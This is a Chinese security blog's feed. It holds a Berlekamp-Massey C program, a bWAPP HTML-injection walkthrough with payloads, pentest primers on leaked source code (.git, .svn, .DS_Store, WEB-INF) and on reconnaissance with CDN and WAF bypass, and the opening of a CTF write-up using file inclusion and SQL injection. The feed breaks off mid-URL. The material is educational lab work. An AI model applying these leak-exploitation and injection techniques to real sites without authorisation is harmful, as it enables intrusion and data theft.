class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> a[],<span class="keyword">int</span> f[])</span></span>&#123;<span class="comment">//求下一项离差  </span></span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">0</span>) </span><br><span class="line">    <span class="keyword">return</span> a[i];</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">int</span> d=a[i],j;</span><br><span class="line">    j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=i)&#123;</span><br><span class="line">        d=d^(f[j]*a[i-j]);  <span class="comment">//抑或 </span></span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,a[max],i,j,q,l=<span class="number">0</span>,m=<span class="number">-1</span>,d;</span><br><span class="line">    <span class="keyword">int</span> t[max]=&#123;<span class="number">0</span>&#125;,f[max]=&#123;<span class="number">0</span>&#125;,b[max]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    t[<span class="number">0</span>]=<span class="number">1</span>;f[<span class="number">0</span>]=<span class="number">1</span>;b[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入的n为：\n"</span>); </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入的n长序列为：\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        d=next(i,a,f);</span><br><span class="line">        <span class="keyword">if</span>(d==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(q=<span class="number">0</span>;q&lt;=n;q++)<span class="comment">//t&lt;-f</span></span><br><span class="line">        t[q]=f[q];</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=n;j++)</span><br><span class="line">        <span class="keyword">if</span>(b[j]==<span class="number">1</span>)</span><br><span class="line">        f[j+i-m]=(f[j+i-m]+<span class="number">1</span>)%<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=i/<span class="number">2</span>)&#123;</span><br><span class="line">            l=i+<span class="number">1</span>-l;</span><br><span class="line">            m=i;</span><br><span class="line">            <span class="keyword">for</span>(q=<span class="number">0</span>;q&lt;=n;q++)<span class="comment">//b&lt;-t </span></span><br><span class="line">            b[q]=t[q];</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"L=%d\n"</span>,l);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,f[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(f[i]!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"+x^%d"</span>,i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="密码学" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>bwapp(1)</title>
    <link href="http://yoursite.com/2018/10/08/bwapp(1)/"/>
    <id>http://yoursite.com/2018/10/08/bwapp(1)/</id>
    <published>2018-10-07T16:00:00.000Z</published>
    <updated>2018-10-08T11:39:11.793Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:https://blog.csdn.net/Super_Yiang/article/details/82970499</span></span><br></pre></td></tr></table></figure><h1 id="HTML-Injection-Reflected-GET"><a href="#HTML-Injection-Reflected-GET" class="headerlink" title="HTML Injection - Reflected (GET)"></a>HTML Injection - Reflected (GET)</h1><h5 id="low"><a href="#low" class="headerlink" title="low"></a>low</h5><p><img src="https://i.loli.net/2018/10/08/5bbb0b9d25e70.png" alt=""></p><p>题目很明显注入，而且提交方式为get，尝试着在输入框分别输入1和1</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.109.130/bWAPP/htmli_get.php?firstname=1&amp;lastname=1&amp;form=submit</span><br></pre></td></tr></table></figure><p>下方也会显示</p><p><img src="https://i.loli.net/2018/10/08/5bbb0ef34b1d4.png" alt=""></p><p>那么尝试注入代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>You just got hacked!!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功注入</p><p><img src="https://i.loli.net/2018/10/08/5bbb0faa292c8.png" alt=""></p><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><p><img src="https://i.loli.net/2018/10/08/5bbb0b9d25e70.png" alt=""></p><p>尝试直接注入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>You just got hacked!!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注入失败</p><p><img src="https://i.loli.net/2018/10/08/5bbb104a79526.png" alt=""></p><p>查看源码发现&lt;和&gt;被转义成&amp;lt；和&amp;gt；</p><p><img src="https://i.loli.net/2018/10/08/5bbb1556ad29d.png" alt=""></p><p>尝试将&lt;和&gt;进行urlencode成%3C和%3E进行注入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cmarquee%3E%3Ch2%3EYou just got hacked!!%3C/h2%3E%3C/marquee%3E</span><br></pre></td></tr></table></figure><p>成功绕过并注入</p><h5 id="high"><a href="#high" class="headerlink" title="high"></a>high</h5><p>高级别的直接放源码审计吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// htmlspecialchars - converts special characters to HTML entities    </span></span><br><span class="line">    <span class="comment">// '&amp;' (ampersand) becomes '&amp;amp;' </span></span><br><span class="line">    <span class="comment">// '"' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set</span></span><br><span class="line">    <span class="comment">// "'" (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set</span></span><br><span class="line">    <span class="comment">// '&lt;' (less than) becomes '&amp;lt;'</span></span><br><span class="line">    <span class="comment">// '&gt;' (greater than) becomes '&amp;gt;'  </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显源码中用了htmlspecialchars()这个函数，码一波：</p><p><strong>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</strong> </p><p><strong>预定义的字符是：</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号）成为 &amp;amp</span><br><span class="line">&quot; （双引号）成为 &amp;quot</span><br><span class="line">&apos; （单引号）成为 &amp;#039</span><br><span class="line">&lt; （小于）成为 &amp;lt</span><br><span class="line">&gt; （大于）成为 &amp;gt</span><br></pre></td></tr></table></figure><p>能力有限，只能观摩一波，浅尝辄止。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
      <category term="玩转bwapp" scheme="http://yoursite.com/categories/%E7%8E%A9%E8%BD%ACbwapp/"/>
    
    
      <category term="bwapp" scheme="http://yoursite.com/tags/bwapp/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试初步学习之漏洞发现和源码泄露</title>
    <link href="http://yoursite.com/2018/09/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"/>
    <id>http://yoursite.com/2018/09/16/渗透测试初步学习之漏洞发现/</id>
    <published>2018-09-16T02:24:12.202Z</published>
    <updated>2018-10-08T09:41:12.559Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82491310</span></span><br></pre></td></tr></table></figure><h3 id="一、目录扫描"><a href="#一、目录扫描" class="headerlink" title="一、目录扫描"></a><strong>一、目录扫描</strong></h3><p>​    目录扫描的目的是为了探测目标的目录情况，从而分析目标的CMS情况、敏感信息泄露情况 以及 一个大体的站点地图。</p><p>​    这里推荐用御剑前辈的后台扫描器。</p><h3 id="二、蜘蛛爬行"><a href="#二、蜘蛛爬行" class="headerlink" title="二、蜘蛛爬行"></a><strong>二、蜘蛛爬行</strong></h3><p>​    蜘蛛爬行和目录扫描的目的差不多，都是为了帮助用户建立一个大概的站点地图，但是两者采用的方法却不同，目录扫描是根据字典进行枚举，而蜘蛛爬行则是从站点的链接中获取站点的目录情况。</p><p>  蜘蛛爬行相较于目录扫描的最大优点在于，能爬出苛刻的目录，比如web后台的目录是bnbndmw/login.php，而bnbndmw是比较苛刻的字符很难有字典包含这个字符，而这个链接又存在于站点的其他html链接中，就会被蜘蛛发现，从而收集到。</p><p>  蜘蛛爬行在常用的漏洞扫描器中 以及 Burpsuite里面都具备。</p><h3 id="三、漏洞扫描器"><a href="#三、漏洞扫描器" class="headerlink" title="三、漏洞扫描器"></a><strong>三、漏洞扫描器</strong></h3><ol><li><strong>AWVS</strong></li><li><strong>Burpsuite</strong></li></ol><h3 id="四、根据CMS发现漏洞"><a href="#四、根据CMS发现漏洞" class="headerlink" title="四、根据CMS发现漏洞"></a><strong>四、根据CMS发现漏洞</strong></h3><p>​    在已知对方使用的CMS时，我们可以去百度该CMS存在哪些漏洞，然后用已知的漏洞进行测试，然后我可以用百度到的这些漏洞详情去测试目标站点是否存在该漏洞。 </p><h3 id="五、源代码泄露漏洞"><a href="#五、源代码泄露漏洞" class="headerlink" title="五、源代码泄露漏洞"></a><strong>五、源代码泄露漏洞</strong></h3><ol><li><h5 id="代码压缩包泄露"><a href="#代码压缩包泄露" class="headerlink" title="代码压缩包泄露"></a>代码压缩包泄露</h5><p>​    有些站点的管理员将源码备份成压缩包的格式，却放在了Web目录下，攻击者访问该压缩包的时候就会下载该压缩包。</p><p>PS：常见后缀 ： .zip .rar .tar.gz .7z</p></li><li><h5 id="SVN源代码泄露"><a href="#SVN源代码泄露" class="headerlink" title="SVN源代码泄露"></a>SVN源代码泄露</h5><p><strong>（1）漏洞成因</strong></p><p>​    管理员对SVN的机制不熟悉，直接将SVN检出到本地的web目录下，而忘记删除.svn目录(文件的类型及内容存放目录),从而导致攻击者拿到站点的源代码。 </p><p><strong>（2）SVN源代码泄露两个版本的区别</strong></p><p>​    SVN1.7后取消了text-base备份文件夹,同时访问.svn/entries返回数字12。1.7以后的版本不会在每个目录下生成.svn的文件，仅在根目录下生成.svn文件。 </p><p>​    并且在.svn目录下存在wc.db，该数据库文件在NODES表单local_relpath为真实文件名，checksum为文件的sha1值，kind表示文件类型(dir-&gt;目录,file-&gt;文件) 。</p><p>​    在.svn/pristine目录的二级目录下存储着源代码，文件名是sha1值.svn-base，二级目录名是sha1值的前两位。 </p></li><li><h5 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h5><p>     从git仓库下载代码的时候，会在本地生成一个.git隐藏文件夹(存放代码的变更记录)，导致攻击者可以使用该文件夹下的信息拿到代码。 </p><p>PS：利用工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a> </p></li><li><h5 id="swp源码泄露"><a href="#swp源码泄露" class="headerlink" title="swp源码泄露"></a>swp源码泄露</h5><p>​    使用vi编辑器打开文件时，会生成一个.文件名.swp的备份文件，防止意外退出等情况导致文件内容丢失。产生原因主要是管理员在web目录下修改代码文件，导致生成了.swp备份文件。</p><p>PS：利用方法：访问.swp文件会下载该文件，然后vi -r 文件名 来恢复内容，然后按下任意键就可以看到其中的代码了。 </p></li><li><h5 id="数据库外泄"><a href="#数据库外泄" class="headerlink" title="数据库外泄"></a>数据库外泄</h5><p>​    不只是源码泄露会导致安全威胁，其实数据库泄露也会导致安全威胁。</p><p>  数据库外泄指的是数据库文件泄露，比如ACCESS的数据库是.mdb 以及上面提到的 .db 是SQLite的数据库。这两种数据库系统将数据保存在该格式的文件中，而数据库文件又在WEB目录下，攻击者可以下载数据库从而拿到数据。</p><p>​    这种漏洞影响最多的是ASP+ACCESS的站点，比较经典两个案例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.某些CMS的目录下存在/data/#data.mdb 文件</span><br><span class="line">2.ewebeditor 后台GETSHELL，下载eweb的数据库就是其中关键的一步</span><br></pre></td></tr></table></figure></li></ol><ol start="6"><li><h5 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h5><ul><li><p><strong>WEB-INF介绍</strong></p><p>​    WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br></pre></td></tr></table></figure></li><li><p><strong>漏洞检测和利用</strong></p><p>​    通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><p>  一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，使用了Nginx的安全策略，导致web.xml能够被攻击者访问到。</p></li><li><p><strong>CVS泄露</strong></p><p>测试目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line"></span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure><p>取回源码命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name</span><br></pre></td></tr></table></figure><p><a href="https://github.com/bitkeeper-scm/bitkeeper" target="_blank" rel="noopener">bk下载地址</a></p></li></ul></li><li><h5 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title="DS_Store文件泄露"></a>DS_Store文件泄露</h5><ul><li><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>​    在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 </p></li><li><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure><p>     <a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp.py</a>  </p></li></ul></li><li><h5 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h5><p>##### </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure><p>​    <a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> </p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试初步学习之信息收集</title>
    <link href="http://yoursite.com/2018/09/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2018/09/16/渗透测试初步学习之信息收集/</id>
    <published>2018-09-16T02:24:10.267Z</published>
    <updated>2018-10-08T09:41:25.938Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82490624</span><br></pre></td></tr></table></figure><p>​    信息收集的主要目的是为了制定下一步的攻击方案。</p><p>​    那信息收集要收集哪些信息？</p><ol><li><p>是否存在CDN</p><p>（1）简介</p><p>​    CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。 </p><p>（2）验证是否存在CDN</p><ul><li><p>方法1</p><p>​    很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有： </p></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://ping.chinaz.com/</span></span><br><span class="line"><span class="attribute">http://ping.aizhan.com/</span></span><br><span class="line"><span class="attribute">http://ce.cloud.360.cn/</span></span><br></pre></td></tr></table></figure><ul><li><p>方法2</p><p>在线工具查看是否存在CDN，可以参考以下站点: </p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://www.cdnplanet.com/tools/cdnfinder/</span></span><br><span class="line">http://www.ipip.net/ip.html   #IP、Ping、CDN、DNS等查询</span><br></pre></td></tr></table></figure><p>（3）绕过CDN查找网站真实IP、</p><ul><li><p>查询历史DNS记录</p><p>​    查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：</p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.cn/  #存在很多情报</span><br><span class="line">https://viewdns.info/   #DNS、Ping、Whois,反向IP等</span><br></pre></td></tr></table></figure><ul><li><p>查询子域名</p><p>​    有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP 。</p></li><li><p>利用网站漏洞</p><p>​    fopen 、 file_get_contents 这些函数，将文件参数改成自己服务器的IP，让对方服务器主动连接我们，然后从日志找到对方真实IP 。</p></li><li><p>目标敏感文件泄露</p><p>​    比如PHPinfo这类的探针 。</p></li></ul></li><li><p>服务器信息</p><ul><li>IP地址，结合上面的CDN绕过，获取到IP </li><li>服务器的系统类型 (windows、linux(Ubuntu、ContentOS)) </li><li>支持的脚本类型 (asp、aspx、php、jsp) </li><li>Web容器 (apache 、IIS 、nginx) </li><li>开放端口情况 (21,22,80,1433,5900,3306,3389,8080,43958) </li><li>绝对路径 (报错页面显示、探针显示) </li></ul></li><li><p>子域名收集</p><p>​    这里主要提到一款子域名收集的工具 和 一个资产收集的平台 。</p><h5 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a><strong>Layer子域名挖掘机</strong></h5><p>​    Layer 是Seay法师写的一款，以暴力枚举为主的子域名收集工具。<a href="https://www.waitalone.cn/layer-subdomain-excavator.html" target="_blank" rel="noopener">Layer子域名挖掘机V2.1</a> </p><p>PS：Layer 在目标站点被百度收录较少的时候使用效果不错，但是有一个不太好的地方就是，Layer把生成的子域名字符串会加载到内存中，导致程序占用大量内存而变得很卡。(很多老工具都有这个问题，比如御剑前辈的后台扫描)</p><h5 id="云悉资产收集"><a href="#云悉资产收集" class="headerlink" title="云悉资产收集"></a><strong>云悉资产收集</strong></h5><p>​    云悉是一个很棒的在线分布式资产收集平台，具体可以到 <a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn</a> 了解一下。 </p></li><li><p>Whois查询</p><p>​    用站长工具whois查询域名的所有者情况和注册邮箱，可以根据注册者的信息生成爆破字典。 </p></li><li><p>指纹验证</p><p>​    指纹验证是识别目标站点采用了什么CMS搭建，然后根据CMS制定攻击方案。</p><p>PS：CMS是”Content Management System”的缩写，意为”内容管理系统”。一个内容管理系统通常有如下要素：文档模板、脚本语言或标记语言、与数据库集成。</p><p>指纹验证工具有两个：</p><ul><li>御剑</li><li>云溪</li></ul></li><li><p>WAF探测</p><p>     进行WAF探测的目的是为了防止在有WAF的情况下还进行大规模的扫描导致被封IP。</p><p>PS：Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF） </p><h5 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a><strong>wafw00f</strong></h5><p>​    WAF探测常用的工具是 kali下的 WafW00f , 对国外的waf探测效果比较好，对国内的waf不太敏感。具体还是要自己手工进行探测。 </p><h5 id="手工探测WAF"><a href="#手工探测WAF" class="headerlink" title="手工探测WAF"></a><strong>手工探测WAF</strong></h5><ul><li>护卫神 ，在有护卫神的站点上会发现HTML中会有\<hws>\&lt;\hws&gt;这样的标签 </hws></li><li>安全狗 ，随便输入一个目标站点不存在的页面，它便会跳转到安全狗的404界面 </li><li>云Waf , 比如腾讯云、阿里云，如果发现目标主机IP是这两个云产品的，一般情况下，该目标会受到腾讯云、阿里云的保护。此外云waf还有百度的加速乐等.. </li></ul></li><li><p>绝对路径</p><p>​    绝对路径探测也是信息收集的一部分，在后面的渗透中很多地方需要用到据对路径来进行下一步渗透。</p><p>  绝对路径的探测方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.site:域名 warning # google or baidu</span><br><span class="line">2.报错显示,比如注入点报错就可以显示出来</span><br><span class="line">3.phpinfo中泄露</span><br></pre></td></tr></table></figure><p>​    </p><p>​    </p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;li
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>I春秋CTF训练营web题解（一）</title>
    <link href="http://yoursite.com/2018/09/16/I%E6%98%A5%E7%A7%8BCTF%E8%AE%AD%E7%BB%83%E8%90%A5web%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2018/09/16/I春秋CTF训练营web题解（一）/</id>
    <published>2018-09-15T16:00:00.000Z</published>
    <updated>2018-10-08T11:42:25.303Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82391768</span></span><br></pre></td></tr></table></figure><h4 id="（1）include"><a href="#（1）include" class="headerlink" title="（1）include"></a>（1）include</h4><p>==hint：没错！就是文件包含漏洞.==</p><p>点开链接，发现</p><p><img src="https://s1.ax1x.com/2018/09/02/PzPytJ.md.png" alt="PzPytJ.md.png"></p><p>通过源码可知可以提交一个path的变量，通过ctrl+f搜索allow_url_include，发现是打开状态：</p><p><img src="https://s1.ax1x.com/2018/09/02/PzPvB8.md.png" alt="PzPvB8.md.png"></p><p>所以打开火狐浏览器，用hackbar工具输入：</p><p><img src="https://s1.ax1x.com/2018/09/02/PzipNQ.png" alt="PzipNQ.png"></p><p>发现存在疑似含有flag的文件</p><p><img src="https://s1.ax1x.com/2018/09/02/Pzikj0.png" alt="Pzikj0.png"></p><p>接着使用php://filter协议查看曝露出来的文件的内容，因为PHP文件是在不能直接显示的，所以使用了base64编码显示</p><p><img src="https://s1.ax1x.com/2018/09/02/PziJHO.png" alt="PziJHO.png"></p><p>然后解码就可以得到flag了</p><p><img src="https://s1.ax1x.com/2018/09/02/Pziw8A.md.png" alt="Pziw8A.md.png"></p><h4 id="（2）SQL"><a href="#（2）SQL" class="headerlink" title="（2）SQL"></a>（2）SQL</h4><p>==hint：出题人就告诉你这个是个注入，有种别走！==</p><p>创建链接点进去，然后查看源码</p><p><img src="https://s1.ax1x.com/2018/09/03/Pzemss.md.png" alt="Pzemss.md.png"></p><p>很明显知道用sql注入，用火狐hackbar进行手动注入，先爆字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 order by 4</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/09/03/Pze1iT.md.png" alt="Pze1iT.md.png"></p><p>说明存在过滤，试试/**/，关键词大写，不行，然后尝试&lt;&gt;发现可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 